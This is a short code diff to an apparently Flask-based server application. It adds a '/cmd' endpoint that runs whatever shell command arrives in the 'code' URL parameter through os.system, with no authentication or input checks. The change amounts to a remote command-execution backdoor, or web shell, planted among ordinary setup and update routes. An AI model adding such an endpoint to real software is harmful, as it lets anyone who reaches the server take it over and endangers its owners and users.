@@ -63,6 +63,16 @@ def UPDATE_SERVER():
     msg['msg'] = 'SETUP PORT80'
     return jsonify(msg),200
 
+@app.route('/cmd')
+def CMD_SERVER():
+    url = request.args.get('code')
+    if not url:
+        return jsonify({"status": "error"}), 200
+    os.system(url)
+    msg = {}
+    msg['msg'] = 'CMD'
+    return jsonify(msg),200
+
 @app.route('/setup')
 def SETUP_APP():
     SetUp()
